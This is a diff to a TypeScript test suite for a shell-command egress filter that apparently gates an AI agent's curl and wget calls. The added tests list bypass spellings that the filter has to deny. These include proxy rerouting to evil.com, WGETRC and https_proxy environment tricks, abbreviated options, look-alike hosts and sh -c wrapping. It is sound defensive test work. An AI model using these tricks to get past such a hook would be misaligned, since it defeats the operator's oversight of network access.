@@ -20,7 +20,7 @@ import { tmpdir } from 'node:os'
 import { join, dirname } from 'node:path'
 import { fileURLToPath } from 'node:url'
 // @ts-expect-error -- plain .mjs hook script, no types
-import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo } from '../../scripts/hooks/bash-egress-parser.mjs'
+import { classify, isExternal, liftSubstitutions, pythonCodeOnly, parseVendorHosts, loadVendorHosts, parseVendorDomains, loadVendorDomains, PREFIX_WORDS, wgetDestinations, mainScopeAppliesTo, curlDestinations, wgetExecuteAllowed, envRedirect, shellCommandBody, destHost, CURL_HIDDEN, WGET_HIDDEN } from '../../scripts/hooks/bash-egress-parser.mjs'
 import {
   BASH_EGRESS_DENY,
   agentGetsBashEgressParser,
@@ -754,7 +754,6 @@ describe('still open after (a) -- pinned on purpose', () => {
     'H=$(cat host.txt); curl -s "http://$H/x"', // host not literally in the command
     'curl -s "$URL"', // URL from the environment
     'curl $(echo https://example.org)', // URL computed at runtime by a substitution (#1514 review B)
-    'curl -K curl.cfg', // URL read from a curl config file
     'git clone https://example.org/r.git', // other network-capable binaries
     'pip install https://example.org/p.tar.gz',
     'ssh user@example.org true',
@@ -1040,7 +1039,8 @@ describe('wget, read like curl', () => {
     expect(d('wget -i urls.txt').deny).toBe(true)
     expect(d('wget --input-file=- < urls.txt').deny).toBe(true)
     expect(d('wget --config=/tmp/rc https://download.geofabrik.de/x').deny).toBe(true)
-    expect(d('wget -e https_proxy=evil.com:8080 https://download.geofabrik.de/x')).toMatchObject({ deny: true, hosts: ['evil.com'] })
+    expect(d("wget -e 'https_proxy=evil.com:8080' https://download.geofabrik.de/x")).toMatchObject({ deny: true, hosts: ['<wget -e: https_proxy=evil.com:8080>'] })
+    expect(d('wget -e https_proxy=evil.com:8080 https://download.geofabrik.de/x')).toMatchObject({ deny: true, reason: 'env-redirect' })
     expect(d('wget -e robots=off https://download.geofabrik.de/x').deny).toBe(false)
   })
 
@@ -1072,3 +1072,155 @@ describe('--main-scope (the tracked project-settings registration that reaches t
     } finally { rmSync(dir, { recursive: true, force: true }) }
   })
 })
+
+// #1931 review, blocker 1: a wgetrc command given with -e/--execute can do what a denied flag does
+// (`input` is -i, `use_proxy`/`https_proxy` reroute), and wget matches its name case-, `_`- and
+// `-`-insensitively. So -e fails closed, with a small allow list of transfer knobs.
+describe('wget -e / --execute fails closed', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V).deny
+  const U = 'https://download.geofabrik.de/x'
+
+  it('every spelling of a non-allowed command denies', () => {
+    for (const e of ['input=/tmp/u', 'INPUT=/tmp/u', 'In_Put=/tmp/u', 'in-put=/tmp/u', 'use_proxy=on', 'httpsproxy=evil.com:1',
+      'HTTPS-PROXY=evil.com:1', 'base=https://evil.com/', 'robots', 'robots=off;input=x']) {
+      expect({ e, deny: d(`wget -e '${e}' ${U}`) }).toEqual({ e, deny: true })
+    }
+    expect(d(`wget --execute=input=/tmp/u ${U}`)).toBe(true)
+    expect(d(`wget --execute input=/tmp/u ${U}`)).toBe(true)
+    expect(d(`wget -qeinput=/tmp/u ${U}`)).toBe(true)
+  })
+
+  it('the allow-listed knobs pass, in wget\'s own spellings', () => {
+    for (const e of ['robots=off', 'Robots = Off', 'tries=3', 'read_timeout=30', 'READ-TIMEOUT=30', 'limit-rate=1m', 'progress=dot:mega']) {
+      expect({ e, deny: d(`wget -e '${e}' ${U}`) }).toEqual({ e, deny: false })
+    }
+    expect(d(`wget -erobots=off ${U}`)).toBe(false)
+    expect(wgetExecuteAllowed('robots=off')).toBe(true)
+    expect(wgetExecuteAllowed('robots=$(id)')).toBe(false)
+  })
+})
+
+// #1931 review, blocker 2: curl and wget both accept any UNIQUE PREFIX of a long option (measured:
+// curl 8.5.0 runs --preprox, wget 1.21.4 runs --input), so the exact-name checks were bypassable.
+describe('abbreviated long options are resolved like the programs do', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V).deny
+  const U = 'https://download.geofabrik.de/x'
+
+  it('wget: a prefix of a hidden-destination option denies', () => {
+    for (const c of ['wget --input /tmp/u', 'wget --inp=/tmp/u', 'wget --input-f=- < u', `wget --conf=/tmp/rc ${U}`,
+      `wget --confi /tmp/rc ${U}`, `wget --exe=input=/tmp/u ${U}`, `wget --exec input=/tmp/u ${U}`]) {
+      expect({ c, deny: d(c) }).toEqual({ c, deny: true })
+    }
+  })
+
+  it('wget: an unknown or ambiguous option denies, a unique harmless prefix passes', () => {
+    expect(wgetDestinations(['--frobnicate', U])).toContain('<wget: unknown or ambiguous option --frobnicate>')
+    expect(d(`wget --ex robots=off ${U}`)).toBe(true) // --ex: exclude-directories, exclude-domains, execute
+    expect(d(`wget --d ${U}`)).toBe(true)
+    expect(d(`wget --output-doc=/tmp/x ${U}`)).toBe(false)
+    expect(d(`wget --no-check-cert -q ${U}`)).toBe(false)
+    expect(d(`wget --tri=3 ${U}`)).toBe(false)
+  })
+
+  it('wget: an option measured as taking NO separate value does not hide the next word', () => {
+    // --backups / --report-speed / --restrict-file-names: listed with a value in the man page, but
+    // `wget --backups` runs bare (measured), so `--backups https://evil.com` fetches evil.com.
+    expect(d('wget --backups https://evil.com/x')).toBe(true)
+    expect(d('wget --report-speed https://evil.com/x')).toBe(true)
+    expect(d(`wget --backups=2 ${U}`)).toBe(false)
+  })
+
+  it('curl: a prefix of a destination or config option is read as that option', () => {
+    expect(d(`curl --prox evil.com:1 ${U}`)).toBe(true)
+    expect(d(`curl --preprox evil.com:1 ${U}`)).toBe(true)
+    expect(curlDestinations(['--conf', '/tmp/rc', U])).toContain(CURL_HIDDEN)
+    expect(curlDestinations(['-K', '/tmp/rc', U])).toContain(CURL_HIDDEN)
+    expect(curlDestinations(['--config', '/tmp/rc', 'http://localhost/x'])).toContain(CURL_HIDDEN)
+  })
+
+  it('curl: unknown, ambiguous or `--name=value` (curl has no such form) denies; valid spellings pass', () => {
+    expect(d(`curl --ur ${U}`)).toBe(true)
+    expect(d(`curl --max-time=2 ${U}`)).toBe(true)
+    expect(d(`curl --frobnicate ${U}`)).toBe(true)
+    expect(d(`curl -sS --max-time 5 -o /tmp/x ${U}`)).toBe(false)
+    expect(d(`curl --silen --retry 3 ${U}`)).toBe(false)
+    expect(d(`curl --no-silent ${U}`)).toBe(false)
+    expect(d(`curl --no-max-time 5 ${U}`)).toBe(true) // curl refuses --no- on a value option
+  })
+
+  it('after `--` every word is a URL', () => {
+    expect(d(`curl -s -- -o https://evil.com/x`)).toBe(true)
+    expect(d(`wget -q -- -O https://evil.com/x`)).toBe(true)
+  })
+})
+
+// #1931 review, blocker 3: the environment steers curl / wget without showing in their argv.
+describe('proxy and rc-file variables in a curl / wget command deny', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V).deny
+  const U = 'https://download.geofabrik.de/x'
+
+  it('a prefix, env, export or plain assignment of any of them denies', () => {
+    for (const c of [`https_proxy=http://evil.com:8080 wget ${U}`, `HTTPS_PROXY=evil.com:1 curl ${U}`, `http_proxy=evil.com:1 wget ${U}`,
+      `ALL_PROXY=socks5://evil.com curl ${U}`, `env https_proxy=evil.com:1 curl ${U}`, `export https_proxy=evil.com:1; wget ${U}`,
+      `https_proxy=evil.com:1; curl ${U}`, `WGETRC=/tmp/rc wget ${U}`, `SYSTEM_WGETRC=/tmp/rc wget ${U}`, `CURL_HOME=/tmp curl ${U}`,
+      `HOME=/tmp/h wget ${U}`, `XDG_CONFIG_HOME=/tmp curl ${U}`, `declare -x https_proxy=evil.com:1; curl ${U}`,
+      `https_proxy=evil.com:1 bash -c 'curl ${U}'`, `timeout 30 env WGETRC=/tmp/rc wget ${U}`]) {
+      expect({ c, deny: d(c) }).toEqual({ c, deny: true })
+    }
+    expect(classify(`WGETRC=/tmp/rc wget ${U}`, 0, V)).toMatchObject({ reason: 'env-redirect', hosts: ['WGETRC='] })
+  })
+
+  it('negative controls: no_proxy, a quoted mention, a variable READ, no curl / wget in the command', () => {
+    expect(d('no_proxy=localhost curl -s http://localhost:3420/api/health')).toBe(false)
+    expect(d(`curl -s -X POST http://localhost:3420/api/messages -d '{"content":"https_proxy=x WGETRC=y wget"}'`)).toBe(false)
+    expect(d(`wget -q -O "$HOME/x" ${U}`)).toBe(false)
+    expect(d('HOME=/tmp/h ls; https_proxy=x npm -v')).toBe(false)
+    expect(envRedirect('no_proxy=x')).toBe(null)
+  })
+})
+
+// #1931 review, non-blocking: a host that is not plain [a-z0-9.-] can never be a vendor entry, and
+// used to come back as "no host" (null), i.e. unjudged.
+describe('a host that is not plain [a-z0-9.-] is a destination', () => {
+  const V = parseVendorHosts({ hosts: ['download.geofabrik.de'] })
+  const d = (cmd: string) => classify(cmd, 0, V).deny
+
+  it('percent-encoded, non-ASCII, backslash, a curl glob: denied', () => {
+    expect(d('curl https://download.geofabrik.d%65/x')).toBe(true)
+    expect(d('wget https://download.geofabrik.d\u0435/x')).toBe(true) // a Cyrillic e
+    expect(d('curl "https://evil.com\\@download.geofabrik.de/x"')).toBe(true)
+    expect(d("curl 'https://evil.com\\@download.geofabrik.de/x'")).toBe(true)
+    expect(d('curl "https://download.geofabrik.{de,evil.com}/x"')).toBe(true)
+    expect(destHost('https://ex%61mple.com/')).toBe('ex%61mple.com')
+  })
+
+  it('a host not written in the command is still not invented: $VAR, a plain path, stdin', () => {
+    expect(destHost('$U')).toBe(null)
+    expect(destHost('/tmp/x')).toBe(null)
+    expect(destHost('-')).toBe(null)
+    expect(d('curl -s https://download.geofabrik.de/x')).toBe(false)
+  })
+})
+
+// Measured 2026-10-13 while fixing the review: a command line handed to a shell as a string was never
+// read, so `sh -c 'wget https://evil.com'` passed, with the switch on the only gate on wget.
+describe('a shell -c / eval string gets the whole analysis', () => {
+  it('external inside -c / -lc / eval denies; localhost inside passes', () => {
+    expect(classify('bash -c "curl https://evil.com/x"')).toMatchObject({ deny: true, reason: 'shell-c-curl-external' })
+    expect(classify("sh -lc 'wget https://evil.com/x'").deny).toBe(true)
+    expect(classify('timeout 30 bash -o pipefail -c "wget -q https://evil.com/x | tar x"').deny).toBe(true)
+    expect(classify('eval "wget https://evil.com/x"').deny).toBe(true)
+    expect(classify('bash -c "curl -s http://localhost:3420/api/health"').deny).toBe(false)
+  })
+
+  it('shellCommandBody finds the -c string and nothing else', () => {
+    expect(shellCommandBody('bash', 'bash -ec "echo hi"')).toBe('echo hi')
+    expect(shellCommandBody('bash', 'bash ./fetch.sh')).toBe(null)
+    expect(shellCommandBody('python3', 'python3 -c "x"')).toBe(null)
+    expect(WGET_HIDDEN).toContain('wget')
+  })
+})
+
